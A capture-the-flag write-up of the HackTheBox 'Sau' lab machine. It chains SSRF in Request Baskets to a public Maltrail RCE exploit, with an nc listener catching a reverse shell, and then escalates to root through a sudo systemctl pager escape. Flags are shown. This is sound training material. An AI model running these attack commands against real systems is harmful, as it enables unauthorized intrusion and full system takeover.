# HackTheBox Sau

Easy level CTF lab machine of the HackTheBox platform running Linux containing public exploits, SSRF, RCE.

## Service Overview

The machine is assigned IP address 10.10.11.224, let's scan the ports with Nmap:

```bash
$ nmap -sS -sC -sV -T4 -p- 10.10.11.224

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Mon, 11 Sep 2023 15:15:13 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Mon, 11 Sep 2023 15:14:45 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Mon, 11 Sep 2023 15:14:46 GMT
|_    Content-Length: 0
```

## Web interface

We discover a running web app [Request Baskets v1.2.1](https://github.com/darklynx/request-baskets): `http://10.10.11.224:55555`. A quick analysis shows that there is a public [exploit](https://www.exploit-db.com/exploits/51675) for SSRF.

Create basket and set http://localhost:80 and Proxy Response:

```json
  "forward_url": "http://127.0.0.1:80/",
  "proxy_response": true
```

Copy link with basket and open in new tab. We can see Maltrail from 80 port: `Powered by Maltrail (v0.53)`.

There is a public [RCE exploit](https://github.com/spookier/Maltrail-v0.53-Exploit) for versions below 0.53.

First we must update the forward URL accordingly by adding "/login" in `http://10.10.11.224:55555`: `http://localhost:80/login`.

Example:

```bash
$ nc -lnvkp <LOCAL-PORT>
$ nc -lnvkp 4444
$ python3 exploit.py <ATTACKER-IP> <LOCAL-PORT> http://<TARGET-IP>:55555/<BUCKET-NAME>
$ python3 exploit.py 10.10.16.40 4444 http://10.10.11.224:55555/gkpq7kd

And open:
http://10.10.11.224:55555/gkpq7kd
```

## User flag

Immediately picking up the user flag:

```bash
$ nc -lnvkp 4444
listening on [any] 4444 ...
connect to [10.10.16.40] from (UNKNOWN) [10.10.11.224] 49486
$ id
id
uid=1001(puma) gid=1001(puma) groups=1001(puma)
$ ls
ls
CHANGELOG     core    maltrail-sensor.service  plugins           thirdparty
CITATION.cff  docker  maltrail-server.service  requirements.txt  trails
LICENSE       h       maltrail.conf            sensor.py
README.md     html    misc                     server.py
$ ls /home
ls /home
puma
$ ls /home/puma
ls /home/puma
user.txt
$ cat /home/puma/user.txt
cat /home/puma/user.txt
a5fb0d435162d1dc71de2e687e01b591
```

## Privilege escalation

Let's check the default privileges for sudo.

```bash
$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

Let's use [gtfobins](https://gtfobins.github.io/gtfobins/systemctl/#sudo) and raise our privileges.

```bash
$ sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!sh

Now while we’re still in the pager, we type the following and press enter:

!sh

!sshh!sh
# id
id
uid=0(root) gid=0(root) groups=0(root)
# ls
ls
CHANGELOG     core    maltrail-sensor.service  plugins           thirdparty
CITATION.cff  docker  maltrail-server.service  requirements.txt  trails
LICENSE       h       maltrail.conf            sensor.py
README.md     html    misc                     server.py
# cd /root
cd /root
# ls
ls
go  root.txt
# cat root.txt
cat root.txt
972155ccbc4a677168e271cdf8ba8424
```